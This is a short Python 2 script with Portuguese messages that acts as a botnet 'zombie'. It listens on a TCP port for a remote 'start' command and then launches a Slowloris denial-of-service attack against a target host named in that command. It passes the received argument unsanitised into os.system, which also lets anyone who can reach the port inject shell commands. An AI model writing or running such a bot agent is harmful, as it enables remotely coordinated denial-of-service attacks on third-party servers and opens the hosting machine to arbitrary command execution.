from socket import *
import os

serverPort = 11750
serverSocket = socket(AF_INET,SOCK_STREAM)
serverSocket.bind(('',serverPort))
serverSocket.listen(1)
print 'Processo zumbi preparado para receber comandos.'
while 1:
    connectionSocket, addr = serverSocket.accept()
    command = connectionSocket.recv(1024)
    args = command.split()
    print "Command" + args[0]
    if args[0] == "start":
        print 'Iniciando o ataque slow loris...'
        connectionSocket.send("Confirmed")
        os.system("python slowloris.py" + " " + args[1])
    else:
        print 'Comando invalido'
        connectionSocket.send("Failed")
    connectionSocket.close()
